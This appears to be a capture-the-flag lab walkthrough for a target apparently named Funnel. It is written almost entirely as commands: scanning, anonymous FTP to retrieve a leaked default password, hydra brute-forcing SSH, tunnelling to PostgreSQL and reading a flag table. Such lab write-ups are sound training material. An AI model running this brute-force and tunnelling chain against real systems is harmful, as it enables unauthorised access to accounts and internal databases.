[[ping]] the host
sudo nmap -sC -sV -p- --min-rate=1000 \[host]
ftp \[target host IP]
login as anonymous and no password
dir 
cd mail_backup
get password_policy.pdf
get welcome28112022
exit
cat password_policy.pdf
funnel123#!#

*enter usernames into a text file*
nano usernames.txt 
*also save the password into password.txt*

hydra -L usernames.txt -P password.txt \[target host IP] ssh
After the target IP address, we specify the protocol for the attack, which in this case is SSH .

ssh christine@\[host IP]

ss -tln

ss -tl

ssh -L 1234:localhost:5432 christine@\[target host IP]

sudo apt update && sudo apt install psql
psql -U christine -h localhost -p 1234

\l
*press q to leave*
\c secrets
\dt
SELECT \* FROM flag;